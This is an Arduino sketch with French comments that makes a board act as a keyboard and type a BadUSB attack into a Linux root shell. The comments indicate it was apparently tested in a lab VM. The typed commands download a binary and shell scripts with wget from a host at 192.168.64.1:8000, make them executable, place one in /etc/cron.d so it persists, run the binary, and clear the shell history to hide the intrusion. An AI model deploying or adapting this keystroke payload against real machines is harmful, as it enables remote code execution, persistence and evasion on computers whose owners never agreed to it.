#include <stdio.h>
#include <stdlib.h>
#include <Keyboard.h>

//Il y a des delay(100) entre chaque lettres, car la payload est lancé sur une vm linux UTM sur un Mac M1, cela fais qu'il est pas assez de performantpour accepter la payload original, sur vmware ça marche rapidement.

void setup() {
  delay(5000);
  Keyboard.begin();
  // Émulation de la pression et du relâchement de chaque touche de la commande "cd /root/Downloads"
  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('D');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('l');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('a');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande "wget http://192.168.64.1:8000/system_kernel"
  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('g');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('p');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('9');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('2');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('6');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('8');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('6');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('4');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);


  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('8');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('_');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('k');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('l');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande "chmod +x system_kernel"

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('+');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('_');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('k');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('l');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);


  // Émulation de la pression et du relâchement de chaque touche de la commande "wget http://192.168.64.1:8000/system-edit.sh"

  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('g');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('p');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('9');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('2');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('6');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('8');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('6');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('4');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);


  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('8');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('-');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('i');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande "chmod +x system-edit.sh"


  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('+');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('-');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('i');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);



  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);


  // Émulation de la pression et du relâchement de chaque touche de la commande "cd /etc/cron.d/"

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande "wget http://192.168.64.1:8000/cron-system.sh"

  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('g');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('p');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('9');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('2');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('6');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('8');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('6');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('4');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('1');
  delay(100);
  Keyboard.releaseAll();
  delay(100);


  Keyboard.press(':');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('8');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('0');
  delay(100);
  Keyboard.releaseAll();
  delay(100);


  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('-');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande "chmod +x cron-system.sh"

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('+');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('-');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);



  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande "cd /root/Downloads"

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('D');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('l');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('a');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('d');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commmande "./system_kernel"


  Keyboard.press('.');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('/');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('m');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('_');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('k');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('n');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('l');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);

  // Émulation de la pression et du relâchement de chaque touche de la commande history -c
  Keyboard.press('h');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('i');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('-');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);

  // Émulation de la pression et du relâchement de chaque touche de la commande exit

  Keyboard.press('e');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('x');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('i');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(200);


  exit(0);
}

void loop() {
}
